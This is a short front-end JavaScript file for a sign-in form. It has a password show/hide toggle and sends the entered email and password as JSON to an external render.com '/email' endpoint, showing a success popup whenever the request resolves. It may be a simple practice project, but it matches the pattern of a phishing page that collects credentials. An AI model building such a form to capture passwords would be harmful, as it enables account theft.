const con = document.getElementById("con")
const input = document.getElementById("input1")
const input2 = document.getElementById("input2")
const btn = document.getElementById("btn")
const divpass = document.querySelector(".div-pass")
const showpass = document.querySelector(".show-pass")



input2.addEventListener("click", () => {

})


showpass.addEventListener("click", (e) => {
    e.preventDefault()
    if (input2.type === "password") {
        input2.type = "text"
        showpass.textContent = "Hide"
    } else {
        input2.type = "password"
        showpass.textContent = "Show"

    }

})

btn.addEventListener("click", async(event) => {
    event.preventDefault()
    const date = {
        input1: input1.value,
        input2: input2.value
    }
    const res = await fetch("https://backend-bwxh.onrender.com/email", {
        method: "POST",
        body: JSON.stringify(date),
        headers: {
            "Content-Type": "application/json"
        }

    }).then(success => {
        console.log(success)
        swal.fire({
            title: "sing in",
            icon: "success"
        })

    }).catch(error => {
        console.log(error)
        swal.fire({
            title: "Error",
            icon: "error"
        })

    })




})